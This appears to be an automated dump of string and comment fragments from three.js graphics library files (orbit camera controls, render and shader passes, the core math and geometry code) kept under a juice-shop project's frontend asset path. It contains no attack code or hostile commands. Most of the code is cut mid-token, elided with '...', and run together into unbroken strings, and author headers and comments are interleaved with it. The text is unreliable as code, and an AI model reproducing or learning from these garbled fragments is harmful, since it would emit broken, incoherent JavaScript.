)Math.ma ... phi ) )Math.mi ... , phi )Math.PI - EPSvar rad ...  scale;radius  ... * scaleoffset. ... * scaleradius  ... us ) );radius  ... ius ) )Math.ma ... ius ) )Math.mi ... adius )this.ta ...  pan );this.ta ... ( pan )this.target.addoffset. ... heta );offset. ... theta )radius  ... theta )radius  ... ( phi )Math.sin( phi )Math.sin( theta )offset. ...  phi );offset. ... ( phi )Math.cos( phi )Math.cos( theta )positio ... fset );positio ... ffset )positio ... t ).addposition.copythis.ob ... rget );this.ob ... arget )this.object.lookAtthetaDelta = 0;phiDelta = 0;scale = 1;pan.set(0,0,0);pan.set(0,0,0)pan.setif ( la ...       }lastPos ... n ) > 0lastPos ... ition )lastPos ... tanceTothis.di ... vent );this.di ... Event )this.dispatchEventlastPos ... tion );lastPosition.copyreturn  ... eSpeed;2 * Mat ... teSpeed2 * Mat ... 60 / 602 * Math.PI / 602 * Math.PIscope.a ... teSpeedreturn  ... peed );Math.po ... Speed )scope.zoomSpeedif ( sc ... turn; }scope.e ... = falsescope.enabled{ return; }return;event.p ... ault();if ( ev ...       }event.button === 0event.buttonscope.n ... == truescope.noRotatestate = ... ROTATE;state = STATE.ROTATESTATE.ROTATErotateS ... entY );rotateS ... ientY )rotateStart.setevent.clientXevent.clientYevent.button === 1scope.noZoomstate = STATE.DOLLY;state = STATE.DOLLYSTATE.DOLLYdollySt ... entY );dollySt ... ientY )dollyStart.setevent.button === 2scope.noPan === truescope.noPanstate = STATE.PAN;state = STATE.PANSTATE.PANpanStar ... entY );panStar ... ientY )panStart.setscope.d ... alse );scope.d ... false )scope.d ... istenerif ( sc ... return;if ( st ...       }state = ... .ROTATErotateE ... entY );rotateE ... ientY )rotateEnd.setrotateD ... tart );rotateD ... Start )rotateD ... Vectorsscope.r ... peed );scope.r ... Speed )scope.rotateLeft2 * Mat ... ntWidth2 * Mat ... Delta.xrotateDelta.xscope.rotateSpeedscope.rotateUp2 * Mat ... tHeight2 * Mat ... Delta.yrotateDelta.yrotateS ... eEnd );rotateS ... teEnd )rotateStart.copystate = ... E.DOLLYdollyEn ... entY );dollyEn ... ientY )dollyEnd.setdollyDe ... tart );dollyDe ... Start )dollyDe ... VectorsdollyDelta.y > 0dollyDelta.yscope.dollyIn();scope.dollyIn()scope.dollyInscope.dollyOut();scope.dollyOut()scope.dollyOutdollySt ... yEnd );dollySt ... lyEnd )dollyStart.copystate === STATE.PANpanEnd. ... entY );panEnd. ... ientY )panEnd.setpanDelt ... tart );panDelt ... Start )panDelta.subVectorsscope.p ... elta );scope.p ... Delta )scope.panpanStar ... nEnd );panStar ... anEnd )panStart.copyscope.update();scope.update()scope.updatestate = STATE.NONE;scope.e ... == truevar delta = 0;delta = 0event.wheelDelta{ // We ...       }delta = ... lDelta;delta = ... elDeltaevent.detail{ // Fi ...       }delta = ... detail;delta = ... .detail- event.detailif ( de ...       }delta > 0scope.noKeysvar nee ...  false;needUpdate = falsecase sc ...  break;scope.keys.UPscope.keysscope.p ... ed ) );scope.p ... eed ) )new THR ... Speed )scope.keyPanSpeedneedUpdate = true;needUpdate = truebreak;scope.keys.BOTTOM-scope.keyPanSpeedscope.keys.LEFTscope.p ...  0 ) );scope.p ... , 0 ) )new THR ... ed, 0 )scope.keys.RIGHTif ( ne ...       }event.touches.lengthevent.touchescase 1: ...  break;state = ... _ROTATESTATE.TOUCH_ROTATErotateS ... ageY );rotateS ... pageY )event.t ... ].pageXevent.touches[ 0 ]event.t ... ].pageYcase 2: ...  break;state = ... _DOLLY;state = ... H_DOLLYSTATE.TOUCH_DOLLYvar dx  ... .pageX;dx = ev ... ].pageXevent.touches[ 1 ]var dy  ... .pageY;dy = ev ... ].pageYvar dis ... * dy );distanc ...  * dy )Math.sq ...  * dy )dx * dx + dy * dydx * dxdy * dydollySt ... ance );dollySt ... tance )case 3: ...  break;state = ... CH_PAN;state = ... UCH_PANSTATE.TOUCH_PANpanStar ... ageY );panStar ... pageY )default ... E.NONE;event.s ... tion();event.s ... ation()event.s ... agationif ( st ... turn; }state ! ... _ROTATErotateE ... ageY );rotateE ... pageY )state ! ... H_DOLLYdollyEn ... ance );dollyEn ... tance )state ! ... UCH_PANpanEnd. ... ageY );panEnd. ... pageY )this.do ... alse );this.do ... false )this.do ... istenercontextmenufunctio ... lt(); }{ event ... lt(); }mousewheelDOMMouseScrollTHREE.O ... type );THREE.O ... otype )THREE.O ... ototypeObject. ... otype )THREE.E ... patcherP:/My Drive/Git/juice-shop/frontend/src/assets/private/RenderPass.jsRenderPassoverrideMaterialclearAlphaoldClearColorColoroldClearAlphagetClearColorgetClearAlphasetClearColorTHREE.R ... ;\r\n\r\n};THREE.R ... e;\r\n\r\n}THREE.RenderPassthis.ov ... terial;this.ov ... aterialthis.cl ... rColor;this.cl ... arColorthis.clearColorthis.cl ... ha : 1;this.cl ... pha : 1this.clearAlpha( clear ... pha : 1( clear ... fined )clearAl ... definedthis.ol ... olor();this.ol ... Color()this.oldClearColornew THREE.Color()THREE.Colorthis.ol ... ha = 1;this.ol ... pha = 1this.oldClearAlphaTHREE.R ... }\r\n\r\n};THREE.R ... \t}\r\n\r\n}THREE.R ... ototypethis.sc ... terial;this.sc ... aterialthis.ol ... or() );this.ol ... lor() )this.ol ... or.copyrendere ... Color()rendere ... arColorthis.ol ... lpha();this.ol ... Alpha()rendere ... Alpha()rendere ... arAlpharendere ... lpha );rendere ... Alpha )this.sc ... = null;this.sc ...  = nullP:/My Drive/Git/juice-shop/frontend/src/assets/private/ShaderPass.jstextureIDUniformsUtilsmaterialShaderMaterialrenderToScreenTHREE.S ... ;\r\n\r\n};THREE.S ... e;\r\n\r\n}this.te ... ffuse";this.te ... iffuse"this.textureID( textu ... iffuse"( textu ... fined )texture ... definedthis.un ... orms );this.un ... forms )this.uniformsTHREE.U ... forms )THREE.U ... s.cloneTHREE.UniformsUtilsshader.uniformsthis.ma ... \r\n\t} );this.ma ... \n\r\n\t} )this.materialnew THR ... \n\r\n\t} )THREE.ShaderMaterial{\r\n\r\n\t\t ... r\r\n\r\n\t}uniform ... niformsvertexS ... xShadershader.vertexShaderfragmen ... tShadershader. ... tShaderthis.re ...  false;this.re ... = falsethis.renderToScreenthis.ne ... = true;this.ne ...  = truethis.clear = false;this.clear = falseTHREE.S ... }\r\n\r\n};THREE.S ... \t}\r\n\r\n}THREE.S ... ototypethis.un ... ureID ]this.un ... Buffer;this.un ... dBufferthis.un ... ].valueTHREE.E ... terial;THREE.E ... aterialrendere ... mera );rendere ... amera )P:/My Drive/Git/juice-shop/frontend/src/assets/private/three.js
 * @author mrdoob / http://mrdoob.com/
 * @author Larry Battle / http://bateru.com/news
 * @author bhouston / http://exocortex.com
  http://paulirish.com/2011/requestanimationframe-for-smart-animating/// http ... mating/ http://my.opera.com/emoller/blog/2011/12/20/requestanimationframe-for-smart-er-animating// http ... imating requestAnimationFrame polyfill by Erik Mller// requ ...  M\u00f6ller fixes from Paul Irish and Tino Zijdel// fixe ...  Zijdel using 'self' instead of 'window' for compatibility with both NodeJS and IE10.// usin ... d IE10. GL STATE CONSTANTS// GL S ... NSTANTS SHADOWING TYPES// SHADOWING TYPES MATERIAL CONSTANTS// MATE ... NSTANTS side// side shading// shading colors// colors blending modes// blending modes custom blending equations// cust ... uations (numbers start from 100 not to clash with other// (num ... h other  mappings to OpenGL constants defined in Texture.js)//  map ... ure.js) custom blending destination factors// cust ... factors custom blending source factorsTHREE.ZeroFactor = 200;//THREE ...  = 200;THREE.OneFactor = 201;//THREE ...  = 201;THREE.SrcAlphaFactor = 204;//THREE ...  = 204;THREE.OneMinusSrcAlphaFactor = 205;//THREE ...  = 205;THREE.DstAlphaFactor = 206;//THREE ...  = 206;THREE.OneMinusDstAlphaFactor = 207;//THREE ...  = 207; TEXTURE CONSTANTS// TEXTURE CONSTANTS Mapping modes// Mapping modes Wrapping modes// Wrapping modes Filters// Filters Data types// Data types Pixel types// Pixel typesTHREE.UnsignedByteType = 1009;//THREE ... = 1009; Pixel formats// Pixel formats Compressed texture formats// Comp ... formats
// Potential future PVRTC compressed texture formats
THREE.RGB_PVRTC_4BPPV1_Format = 2100;
THREE.RGB_PVRTC_2BPPV1_Format = 2101;
THREE.RGBA_PVRTC_4BPPV1_Format = 2102;
THREE.RGBA_PVRTC_2BPPV1_Format = 2103;
/*\r\n//  ... 03;\r\n*/
 * @author mrdoob / http://mrdoob.com/
  h,s,l ranges are in 0.0 - 1.0// h,s, ... 0 - 1.0 rgb(255,0,0)// rgb(255,0,0) rgb(100%,0%,0%)// rgb(100%,0%,0%) #ff0000// #ff0000 #f00// #f00 red// red
 * @author mikael emtinger / http://gomo.se/
 * @author alteredq / http://alteredqualia.com/
 * @author WestLangley / http://github.com/WestLangley
 * @author bhouston / http://exocortex.com
  http://www.mathworks.com/matlabcentral/fileexchange/ 	20696-function-to-convert-between-dcm-euler-angles-quaternions-and-euler-vectors/// \t206 ... ectors/	content/SpinCalc.m//\tcont ... nCalc.m http://www.euclideanspace.com/maths/geometry/rotations/conversions/angleToQuaternion/index.htm// http ... dex.htm assumes axis is normalized// assu ... malized http://www.euclideanspace.com/maths/geometry/rotations/conversions/matrixToQuaternion/index.htm assumes the upper 3x3 of m is a pure rotation matrix (i.e, unscaled)// assu ... scaled) http://lolengine.net/blog/2014/02/24/quaternion-from-two-vectors-final// http ... s-final assumes direction vectors vFrom and vTo are normalized from http://www.euclideanspace.com/maths/algebra/realNormedAlgebra/quaternions/code/index.htm// from ... dex.htm http://www.euclideanspace.com/maths/algebra/realNormedAlgebra/quaternions/slerp/// http ... /slerp/
 * @author mrdoob / http://mrdoob.com/
 * @author philogb / http://blog.thejit.org/
 * @author egraether / http://egraether.com/
 * @author zz85 / http://www.lab4games.net/zz85/blog
 /**\r\n * ... og\r\n */ This function assumes min < max, if this assumption isn't true it will not operate correctly// This ... rrectly
 * @author mrdoob / http://mrdoob.com/
 * @author *kile / http://kile.stravaganza.org/
 * @author philogb / http://blog.thejit.org/
 * @author mikael emtinger / http://gomo.se/
 * @author egraether / http://egraether.com/
 * @author WestLangley / http://github.com/WestLangley
 /**\r\n * ... ey\r\n */ input: THREE.Matrix4 affine matrix// inpu ...  matrix input: THREE.Matrix4 projection matrix perspective divide// pers ...  divide calculate quat * vector// calc ...  vector calculate result * inverse quat// calc ... se quat vector interpreted as a direction// vect ... rection reflect incident vector off plane orthogonal to normal// refl ...  normal normal is assumed to have unit length// norm ...  length clamp, to handle numerical problems// clam ... roblems
 * @author supereggbert / http://www.paulbrunt.co.uk/
 * @author philogb / http://blog.thejit.org/
 * @author mikael emtinger / http://gomo.se/
 * @author egraether / http://egraether.com/
 * @author WestLangley / http://github.com/WestLangley
  http://www.euclideanspace.com/maths/geometry/rotations/conversions/quaternionToAngle/index.htm q is assumed to be normalized// q is ... malized http://www.euclideanspace.com/maths/geometry/rotations/conversions/matrixToAngle/index.htm variables for result// vari ...  result margin to allow for rounding errors// marg ...  errors margin to distinguish between 0 and 180 degrees// marg ... degrees singularity found// singularity found first check for identity matrix which must have +1 for all terms// firs ... l terms in leading diagonal and zero in other terms// in l ... r terms this singularity is identity matrix so angle = 0// this ... gle = 0 zero angle, arbitrary axis// zero ... ry axis otherwise this singularity is angle = 180// othe ... e = 180 m11 is the largest diagonal term// m11  ... al term m22 is the largest diagonal term// m22  ... al term m33 is the largest diagonal term so base result on this// m33  ... on this return 180 deg rotation// retu ... otation as we have reached here there are no singularities so we can handle normally// as w ... ormally used to normalize// used to normalize prevent divide by zero, should not happen if matrix is orthogonal and should be// prev ... ould be caught by singularity test above, but I've left it in just in case// caug ... in case
 * @author mrdoob / http://mrdoob.com/
 * @author WestLangley / http://github.com/WestLangley
 * @author bhouston / http://exocortex.com
  http://www.mathworks.com/matlabcentral/fileexchange/20696-function-to-convert-between-dcm-euler-angles-quaternions-and-euler-vectors/content/SpinCalc.m// http ... nCalc.m WARNING: this discards revolution information -bhouston// WARN ... houston
 * @author bhouston / http://exocortex.com
  this is a more robust check for empty than ( volume <= 0 ) because volume can get positive with two negative axes// this ... ve axes This can potentially have a divide by zero if the box// This ... the box has a size dimension of 0.// has  ... n of 0. using 6 splitting planes to rule out intersections.// usin ... ctions.
 * @author bhouston / http://exocortex.com
 * @author WestLangley / http://github.com/WestLangley
  Computes the world-axis-aligned bounding box of an object (including its children),// Comp ... ldren), accounting for both the object's, and childrens', world transforms// acco ... nsforms NOTE: I am using a binary pattern to specify all 2^3 combinations below// NOTE ... s below 000// 000 001// 001 010// 010 011// 011 100// 100 101// 101 110// 110 111// 111
 * @author alteredq / http://alteredqualia.com/
 * @author WestLangley / http://github.com/WestLangley
 * @author bhouston / http://exocortex.com
  input: THREE.Matrix4// inpu ... Matrix4 ( based on http://code.google.com/p/webgl-mjs/ )// ( ba ... -mjs/ ) no inverse// no inverse
 * @author mrdoob / http://mrdoob.com/
 * @author supereggbert / http://www.paulbrunt.co.uk/
 * @author philogb / http://blog.thejit.org/
 * @author jordi_ros / http://plattsoft.com
 * @author D1plo1d / http://github.com/D1plo1d
 * @author alteredq / http://alteredqualia.com/
 * @author mikael emtinger / http://gomo.se/
 * @author timknip / http://www.floorplanner.com/
 * @author bhouston / http://exocortex.com
 * @author WestLangley / http://github.com/WestLangley
  TODO: if n11 is undefined, then just set to identity, otherwise copy all other values into matrix// TODO ...  matrix   we should not support semi specification of Matrix4, it is just weird.//   we ...  weird. last column// last column bottom row// bottom rowTODO: make this more efficient//TODO: ... ficient( based on http://www.euclideanspace.com/maths/algebra/matrix/functions/inverse/fourD/index.htm )//( bas ... x.htm ) based on http://www.euclideanspace.com/maths/algebra/matrix/functions/inverse/fourD/index.htm// base ... dex.htm Based on http://www.gamedev.net/reference/articles/article1199.asp// Base ... 199.asp if determine is negative, we need to invert one scale// if d ... e scale scale the rotation part// scal ... on part at this point matrix is incomplete so we can't use .copy()// at t ... .copy() point behind the ray// poin ... the ray from http://www.geometrictools.com/LibMathematics/Distance/Wm5DistRay3Segment3.cpp// from ... nt3.cpp It returns the min distance between the ray and the segment// It r ... segment defined by v0 and v1// defi ...  and v1 It can also set two optional targets :// It c ... rgets : - The closest point on the ray// - Th ... the ray - The closest point on the segment// - Th ... segment The ray and segment are not parallel.// The  ... rallel. region 0// region 0 Minimum at interior points of ray and segment.// Mini ... egment. region 1// region 1 region 5// region 5 region 4// region 4 region 3// region 3 region 2// region 2 Ray and segment are parallel.// Ray  ... rallel. check if the ray lies on the plane first// chec ... e first ray origin is behind the plane (and is pointing behind it)// ray  ... ind it) line is coplanar, return origin// line ...  origin Null is preferable to undefined since undefined means.... it is undefined// Null ... defined Return if the ray never intersects the plane// Retu ... e plane http://www.scratchapixel.com/lessons/3d-basic-lessons/lesson-7-intersecting-simple-shapes/ray-box-intersection/// http ... ection/ These lines also handle the case where tmin or tmax is NaN// Thes ...  is NaN (result of 0 * Infinity). x !== x returns true if x is NaN// (res ...  is NaNreturn point closest to the ray (positive side)//retur ... e side) Compute the offset origin, edges, and normal.// Comp ... normal. from http://www.geometrictools.com/LibMathematics/Intersection/Wm5IntrRay3Triangle3.cpp// from ... le3.cpp Solve Q + t*D = b1*E1 + b2*E2 (Q = kDiff, D = ray direction,// Solv ... ection, E1 = kEdge1, E2 = kEdge2, N = Cross(E1,E2)) by// E1 = ... E2)) by   |Dot(D,N)|*b1 = sign(Dot(D,N))*Dot(D,Cross(Q,E2))//   |D ... (Q,E2))   |Dot(D,N)|*b2 = sign(Dot(D,N))*Dot(D,Cross(E1,Q))//   |D ... (E1,Q))   |Dot(D,N)|*t = -sign(Dot(D,N))*Dot(Q,N)//   |D ... ot(Q,N) b1 < 0, no intersection// b1 < ... section b2 < 0, no intersection// b2 < ... section b1+b2 > 1, no intersection// b1+b ... section Line intersects triangle, check if ray does.// Line ... y does. t < 0, no intersection// t <  ... section Ray intersects triangle.// Ray  ... iangle.
 * @author bhouston / http://exocortex.com
 * @author mrdoob / http://mrdoob.com/
 
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 * @author bhouston / http://exocortex.com
  if both outside plane, no intersection// if b ... section must be this.normal, not normal, as this.normal is normalized// must ... malized Q: should an error be thrown if normal is zero (e.g. degenerate plane)?// Q: s ... plane)? Note: will lead to a divide by zero if the plane is invalid.// Note ... nvalid. Note: this tests if a line intersects the plane, not whether it (or its end-points) are coplanar with it.// Note ... ith it. Unsure if this is the correct method to handle this case.// Unsu ... s case. compute new normal based on theory here:// comp ... y here: http://www.songho.ca/opengl/gl_normaltransform.html// http ... rm.html
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
  http://www.broofa.com/Tools/Math.uuid.htm// http ... uid.htm Clamp value to range <a, b>// Clam ...  <a, b> Clamp value to range <a, inf)// Clam ... a, inf) Linear mapping from range <a1, a2> to range <b1, b2>// Line ... b1, b2> http://en.wikipedia.org/wiki/Smoothstep// http ... othstep Random float from <0, 1> with 16 bits of randomness// Rand ... domness (standard Math.random() creates repetitive patterns when applied over larger space)// (sta ...  space) Random integer from <low, high> interval// Rand ... nterval Random float from <low, high> interval Random float from <-range/2, range/2> interval
 * Spline from Tween.js, slightly optimized (and trashed)
 * http://sole.github.com/tween.js/examples/05_spline.html
 *
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
  approximate length by summing linear segments// appr ... egments first point has 0 length// firs ...  length last point ends with total length// last ...  lengthtmpVec.copy( this.points[ i - 1 ] );//tmpVe ...  1 ] );linearDistance = tmpVec.distanceTo( this.points[ i ] );//linea ...  i ] ); Catmull-Rom// Catmull-Rom static/instance method to calculate barycoordinates// stat ... dinates based on: http://www.blackpawn.com/texts/pointinpoly/default.html// base ... lt.html colinear or singular triangle// coli ... riangle arbitrary location outside of triangle?// arbi ... iangle? not sure if this is the best idea, maybe should be returning undefined// not  ... defined barycoordinates must always sum to 1// bary ... um to 1
 * https://github.com/mrdoob/eventdispatcher.js/
 /**\r\n * ... s/\r\n */
 * @author mrdoob / http://mrdoob.com/
 * @author bhouston / http://exocortex.com/
 * @author stephomi / http://stephaneginier.com/
  direction is assumed to be normalized (for accurate distance calculations)// dire ... ations) Checking boundingSphere distance to ray// Chec ...  to ray Check boundingBox before continuing// Chec ... tinuing if ( geometry instanceof THREE.BufferGeometry ) {

			} else /* if ( ... else */ What do we want? intersection point on the ray or on the segment??// What ... gment?? point: raycaster.ray.at( distance ),// poin ... ance ),
 * @author mrdoob / http://mrdoob.com/
 * @author mikael emtinger / http://gomo.se/
 * @author alteredq / http://alteredqualia.com/
 * @author WestLangley / http://github.com/WestLangley
  assumes q is normalized rotate object on axis in object space// rota ... t space axis is assumed to be normalized// axis ... malized translate object by distance along axis in object space// tran ... t space This routine does not support objects with rotated and/or translated parent(s)// This ... rent(s) add to scene// add to scene remove from scene// remove from scene update children// update children
 * @author mrdoob / http://mrdoob.com/
 * @author supereggbert / http://www.paulbrunt.co.uk/
 * @author julianwa / https://github.com/julianwa
 /**\r\n * ... wa\r\n */ set two vectors with opposing z values find direction from vector to end// find ...  to end Handle LineStrip and LinePieces// Hand ... ePieces Perform the perspective divide// Perf ...  divide Pools// Pools Calculate the boundary coordinate of each vertex for the near and far clip planes,// Calc ... planes, Z = -1 and Z = +1, respectively.// Z =  ... tively. Both vertices lie entirely within all clip planes.// Both ... planes. Both vertices lie entirely outside one of the clip planes. The line segment spans at least one clip plane.// The  ...  plane. v1 lies outside the near plane, v2 inside// v1 l ...  inside v2 lies outside the near plane, v1 inside// v2 l ...  inside v1 lies outside the far plane, v2 inside v2 lies outside the far plane, v2 inside The line segment spans two boundaries, but is outside both of them.// The  ... f them. (This can't happen when we're only clipping against just near/far but good// (Thi ... ut good  to leave the check here for future usage if other clip planes are added.)//  to  ... added.) Update the s1 and s2 vertices to match the clipped line segment.// Upda ... egment.
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
  bounding box// bounding box hoping to find a boundingSphere with a radius smaller than the// hopi ... han the boundingSphere of the boundingBox:  sqrt(3) smaller in the best case// boun ... st case reset existing normals to zero// rese ... to zero indexed elements// indexed elements non-indexed elements (unconnected triangle soup)// non- ... e soup) based on http://www.terathon.com/code/tangent.html// base ... nt.html (per vertex tangents)// (per ... ngents) Gram-Schmidt orthogonalize// Gram ... onalize Calculate handedness// Calc ... dedness
		computeOffsets
		Compute the draw offset for large models by chunking the index buffer into chunks of 65k addressable vertices.
		This method will effectively rewrite the index buffer and remap all attributes to match the new indices.
		WARNING: This method will also expand the vertex count to prevent sprawled triangles across draw offsets.
		indexBufferSize - Defaults to 65535, but allows for larger or smaller chunks.
	/*\r\n\t\tc ... s.\r\n\t*/WebGL limits type of index buffer values to 16-bit.//WebGL ... 16-bit.
		console.log("Computing buffers in offsets of "+size+" -> indices:"+indices.length+" vertices:"+vertices.length);
		console.log("Faces to process: "+(indices.length/3));
		console.log("Reordering "+verticesCount+" vertices.");
		/*\r\n\t\tc ... ;\r\n\t\t*/16-bit buffers//16-bit buffers
			Traverse every face and reorder vertices in the proper offsets of 65k.
			We can have more than 65k entries in the index buffer per offset, but only reference 65k values.
		/*\r\n\t\t\t ... .\r\n\t\t*/Unmapped vertice//Unmapped verticeReused vertices from previous block (duplicate)//Reuse ... licate)Reused vertice in the current block//Reuse ... t blockRe-evaluate reused vertices in light of new offset.//Re-ev ... offset.Reindex the face.//Reindex the face.XXX overflows at 16bit//XXX o ... t 16bit Move all attribute values to map to the new computed indices , also expand the vertice stack to match our new vertexPtr. /* Move ... Ptr. */
		var orderTime = Date.now();
		console.log("Reorder time: "+(orderTime-s)+"ms");
		console.log("Duplicated "+duplicatedVertices+" vertices.");
		console.log("Compute Buffers time: "+(Date.now()-s)+"ms");
		console.log("Draw offsets: "+offsets.length);
		/*\r\n\t\tv ... ;\r\n\t\t*/
		reoderBuffers:
		Reorder attributes based on a new indexBuffer and indexMap.
		indexBuffer - Uint16Array of the new ordered indices.
		indexMap - Int32Array where the position is the new vertex ID and the value the old vertex ID for each vertex.
		vertexCount - Amount of total vertices considered in this reordering (in case you want to grow the vertice stack).
	/*\r\n\t\tr ... ).\r\n\t*/ Create a copy of all attributes for reordering. /* Crea ... ing. */ Move attribute positions based on the new index map /* Move ...  map */ Carry the new sorted buffers locally /* Carr ... ally */
 * @author mrdoob / http://mrdoob.com/
 * @author kile / http://kile.stravaganza.org/
 * @author alteredq / http://alteredqualia.com/
 * @author mikael emtinger / http://gomo.se/
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * @author bhouston / http://exocortex.com
  one-to-one vertex colors, used in ParticleSystem and Line// one- ... nd Line the intermediate typed arrays will be deleted when set to false// the  ... o false update flags// update flags vertex normals weighted by triangle areas// vert ... e areas http://www.iquilezles.org/www/articles/normals/normals.htm// http ... als.htm save original normals// save ... normals - create temp variables on first access// - cr ...  access   otherwise just copy (for faster repeated calls)//   ot ...  calls) use temp geometry to compute face and vertex normals for each morph// use  ... h morph create on first access// crea ...  access set vertices to morph target// set  ...  target compute morph normals// comp ... normals store morph normals// stor ... normals restore original normals// rest ... normals tangents go to vertices// tang ... ertices use UV layer 0 for tangents// use  ... angents vertices// vertices faces// faces uvs// uvs
	 * Checks for duplicate vertices with hashmap.
	 * Duplicated vertices are removed
	 * and faces' vertices are updated.
	 /*\r\n\t * ... .\r\n\t */ Hashmap for looking up vertice by position coordinates (and making sure they are unique)// Hash ... unique) number of decimal points, eg. 4 for epsilon of 0.0001// numb ...  0.0001console.log('Duplicate vertex found. ', i, ' could be using ', verticesMap[key]);//conso ... [key]); if faces are completely degenerate after merging vertices, we// if f ... ces, we have to remove them from the geometry.// have ... ometry. if any duplicate vertices are found in a Face3// if a ... a Face3 we have to remove the face as nothing can be saved// we h ... e saved Use unique set of vertices// Use  ... ertices Geometry splitting// Geom ... litting
 * @author mrdoob / http://mrdoob.com/
 * @author mikael emtinger / http://gomo.se/
 * @author WestLangley / http://github.com/WestLangley
/**\r\n * ... ley\r\n*/ This routine does not support cameras with rotated and/or translated parent(s)
 * @author mrdoob / http://mrdoob.com/
 * @author greggman / http://games.greggman.com/
 * @author zz85 / http://www.lab4games.net/zz85/blog
 
 * Uses Focal Length (in mm) to estimate and set FOV
 * 35mm (fullframe) camera is used if frame size is not specified;
 * Formula based on http://www.bobatkins.com/photography/technical/field_of_view.html
 /**\r\n * ... ml\r\n */
 * Sets an offset in a larger frustum. This is useful for multi-window or
 * multi-monitor/multi-machine setups.
 *
 * For example, if you have 3x2 monitors and each monitor is 1920x1080 and
 * the monitors are in grid like this
 *
 *   +---+---+---+
 *   | A | B | C |
 *   +---+---+---+
 *   | D | E | F |
 *   +---+---+---+
 *
 * then for each monitor you would call it like this
 *
 *   var w = 1920;
 *   var h = 1080;
 *   var fullWidth = w * 3;
 *   var fullHeight = h * 2;
 *
 *   --A--
 *   camera.setOffset( fullWidth, fullHeight, w * 0, h * 0, w, h );
 *   --B--
 *   camera.setOffset( fullWidth, fullHeight, w * 1, h * 0, w, h );
 *   --C--
 *   camera.setOffset( fullWidth, fullHeight, w * 2, h * 0, w, h );
 *   --D--
 *   camera.setOffset( fullWidth, fullHeight, w * 0, h * 1, w, h );
 *   --E--
 *   camera.setOffset( fullWidth, fullHeight, w * 1, h * 1, w, h );
 *   --F--
 *   camera.setOffset( fullWidth, fullHeight, w * 2, h * 1, w, h );
 *
 *   Note there is no reason monitors have to be the same size or in a grid.
 /**\r\n * ... d.\r\n */
 * @author MPanknin / http://www.redplant.de/
 * @author alteredq / http://alteredqualia.com/
  console.log( 'THREE.Cache', 'Adding key:', key );// cons ...  key ); console.log( 'THREE.Cache', 'Checking key:', key ); defaults// defaults parameters from model file// para ... el file modifiers// modifiers textures// textures special case for normal mapped material// spec ... aterial for the moment don't handle displacement texture// for  ... texture todo: unify load API to for easier SceneLoader use// todo ... der use in context of more complex asset initialization// in c ... ization do not block on single failed file// do n ... ed file maybe should go even one more level up// mayb ... evel up disregard empty arrays// disr ...  arrays console.log("type", type, "bits", isQuad, hasMaterial, hasFaceVertexUv, hasFaceNormal, hasFaceVertexNormal, hasFaceColor, hasFaceVertexColor);// cons ... Color); to get face <=> uv index correspondence// to g ... ondence could change this to json.animations[0] or remove completely// coul ... pletely DEPRECATED// DEPRECATED async geometry loaders// asyn ... loaders async hierachy loaders toplevel loader function, delegates to handle_children// topl ... hildren handle all the children from the loaded json and attach them to given parent// hand ...  parent check by id if child has already been handled,// chec ... andled, if not, create new object// if n ...  object meshes// meshes ColladaLoader// ColladaLoader UTF8Loader// UTF8Loader OBJLoader// OBJLoader geometry already loaded// geom ...  loaded use materials from the model file// use  ... el file if there is no material specified in the object// if t ...  object if there is just empty face material// if t ... aterial (must create new material as each model has its own face material)// (mus ... terial) lights// lights cameras// cameras pure Object3D// pure Object3D override children materials// over ... terials if object material was specified in JSON explicitly// if o ... licitly override children visibility// over ... ibility with root node visibility as specified in JSON// with ... in JSON loaders which use EventDispatcher// load ... patcher take care of targets which could be asynchronously loaded objects// take ... objects if there was error and target of specified name doesn't exist in the scene file// if t ... ne file create instead dummy target// crea ...  target (target must be added to scene explicitly as parent is already added)// (tar ...  added) must use this instead of just directly calling callbackTexture// must ... Texture because of closure in the calling context loop// beca ... xt loop first go synchronous elements// firs ... lements fogs// fogs now come potentially asynchronous elements// now  ... lements geometries// geometries count how many geometries will be loaded asynchronously// coun ... onously count how many hierarchies will be loaded asynchronously pass metadata along to jsonLoader so it knows the format version// pass ... version count how many textures will be loaded asynchronously handle wrap after repeat so that default repeat can be overriden// hand ... erriden materials// materials default to vertex colors if "vertexColors" is anything else face colors or 0 / null / false// defa ... / false second pass through all materials to initialize MeshFaceMaterials// seco ... terials that could be referring to other materials out of order// that ... f order objects ( synchronous init of procedural primitives )// obje ... tives ) synchronous callback// sync ... allback just in case there are no async elements// just ... lements Overdrawn pixels (typically between 0 and 1) for fixing antialiasing gaps in CanvasRenderer// Over ... enderer ensure overdraw is backwards-compatable with legacy boolean type// ensu ... an type
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  opacity: <float>,
 *
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  linewidth: <float>,
 *  linecap: "round",
 *  linejoin: "round",
 *
 *  vertexColors: <bool>
 *
 *  fog: <bool>
 * }
 /**\r\n * ...  }\r\n */
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  opacity: <float>,
 *
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  linewidth: <float>,
 *
 *  scale: <float>,
 *  dashSize: <float>,
 *  gapSize: <float>,
 *
 *  vertexColors: <bool>
 *
 *  fog: <bool>
 * }
 
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 *
 * parameters = {
 *  color: <hex>,
 *  opacity: <float>,
 *  map: new THREE.Texture( <Image> ),
 *
 *  lightMap: new THREE.Texture( <Image> ),
 *
 *  specularMap: new THREE.Texture( <Image> ),
 *
 *  envMap: new THREE.TextureCube( [posx, negx, posy, negy, posz, negz] ),
 *  combine: THREE.Multiply,
 *  reflectivity: <float>,
 *  refractionRatio: <float>,
 *
 *  shading: THREE.SmoothShading,
 *  blending: THREE.NormalBlending,
 *  depthTest: <bool>,
 *  depthWrite: <bool>,
 *
 *  wireframe: <boolean>,
 *  wireframeLinewidth: <float>,
 *
 *  vertexColors: THREE.NoColors / THREE.VertexColors / THREE.FaceColors,
 *
 *  skinning: <bool>,
 *  morphTargets: <bool>,
 *
 *  fog: <bool>
 * }
  emissive// emissive
 * @author mrdoob / http://mrdoob.com/
